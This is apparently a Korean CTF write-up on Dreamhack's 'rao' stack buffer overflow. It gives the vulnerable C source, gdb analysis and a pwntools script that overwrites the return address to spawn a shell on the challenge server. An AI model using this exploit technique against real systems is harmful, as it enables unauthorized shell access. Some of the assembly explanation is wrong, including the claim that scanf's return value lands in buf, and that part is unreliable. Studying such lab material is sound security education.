[과제]

**Return Address Overwrite** 

이 문제는 제목처럼 입력 버퍼의 크기를 초과하는 데이터를 입력하여 스택의 Return Address를 덮어씌우는 문제입니다.

먼저 rao.c라는 파일을 확인해줍니다. rao 파일은 컴파일이 완료된 실행 바이너리이고, rao.c는 컴파일 전의 소스 코드 입니다.

```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```
파일을 보면 여러 함수가 있는데,

void init()은 초기 설정이고,

void get_shell()은 쉘을 실행하는 함수입니다.

int main()은 이름처럼 메인 함수입니다.

이 문제의 제목과 같이 취약점은 이 함수 안에 있습니다.

```c
  char buf[0x28];

  scanf("%s", buf);
```
이 부분에서 취약점이 발생하는데, %s는 크기를 제한하지 않는 포멧 지정자입니다.
그래서  buf로 설정된 값을 넘겨도 막지 않고 그대로 스택에 쓰는데, 여기서 스택 버퍼 오버플로우가 발생시켜
main()이 return 0에 도달하게 만들어 문제를 풀어볼 수 있겠습니다. 
main()이 return 0에 도달하면 스택에 저장된 리턴 주소로 점프하는데, 이 점을 이용해 오버플로우로 이 return 주소를 get_shell의 주소로 덮어쓰워 쉘을 획득하면 문제를 풀 수 있습니다.

![gdb]({{ 'image.png' | relative_url }})
disassemble gdb 명령어를 통해 gdb 바이너리 파일을 열어 확인해줍니다.

sub rsp, 0x30으로 스택 프레임에 공간을 마련하는 것을 볼 수 있습니다.
이것이 c코드에서 살펴본 buf변수의 공간이라는 것을 알 수 있습니다.

또, lea rax, [rbp-0x0]을 하는데, 이는 rax가 buf의 주소를 가리키도록 설정하는 것입니다.

이 상태로 scanf함수를 호출하면
scanf함수의 반환 값이 rax에 저장되는 데, 그 주소에는 buf가 있으므로
결과적으로 scanf의 반환값이 buf에 저장될 것임을 알 수 있습니다.

즉, buf에 0x30+0x8bytes의 임의의 문자와 0x8bytes의 return address를 입력하면
ret 실행 시 입력한 return address로 jump할 것이라 생각해볼 수 있습니다.

print get_shell 명령어를 통해 shell의 주소를 알아내줍니다.
![print get_shell]({{ 'image1.png' | relative_url }})
이로써 shell의 주소는 0x4006aa라는 사실을 알아냈습니다.

```py

from pwn import * 

p = remote('host3.dreamhack.games', 14071)

padding = b'A' * 0x30 + b'B' * 0x8
payload = padding + p64(0x4006aa)

p.sendlineafter(b'Input: ', payload)
p.interactive()
```
이제 페이로드를 작성하여 rao를 실행해 쉘을 획득해봅시다. 
작성된 페이로드는 A를 0x30만큼 채우고 RBP를 저장해주고 리턴주소를 쉘 주소로 지정해주게 구성했습니다.

코드 실행 후 드림핵에서 받은 Host와 Port를 입력하면 서버 쉘에 접속할 수 있게 됩니다.

ls로 파일들을 확인한 결과 flag라는 파일이 있었고, cat flag하여 플래그 값을 가져와 문제를 풀며 해결하면 됩니다.